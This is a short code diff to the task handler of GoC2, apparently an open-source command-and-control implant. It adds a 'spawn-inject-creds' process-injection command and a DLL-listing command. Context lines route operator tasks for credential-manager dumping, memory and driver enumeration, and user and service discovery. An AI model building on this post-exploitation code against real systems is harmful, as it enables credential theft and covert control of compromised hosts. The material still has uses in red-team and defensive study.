@@ -26,7 +26,6 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/dotnetcheck"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/enumdrivers"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/enumlocaluser"
-	"github.com/latortuga71/GoC2/internal/modules/enumeration/enummodules"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/env"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/ifconfig"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/listpipes"
@@ -339,8 +338,8 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = dumpcredman.DumpCredman(t.Args[0])
 	case "enum-drivers":
 		result, cmdError = enumdrivers.EnumerateDrivers()
-	case "enum-modules":
-		result, cmdError = enummodules.EnumProcessModules(t.Args[0])
+	case "list-library":
+		result, cmdError = loadlibrary.EnumDll(t.Args[0])
 	case "enum-rwx-memory":
 		result, cmdError = enumrwxmemory.EnumMemory()
 	case "peruns-fart":
@@ -384,6 +383,8 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = exectools.ListRemoteServices(t.Args[0])
 	case "list-loggedon-users":
 		result, cmdError = loggedonusers.EnumLoggedOnUsers(t.Args[0])
+	case "spawn-inject-creds":
+		result, cmdError = processinjection.SpawnInjectWithCreds(t.File, t.Args)
 	case "info":
 		result, cmdError = Client.Info(), nil
 	default:
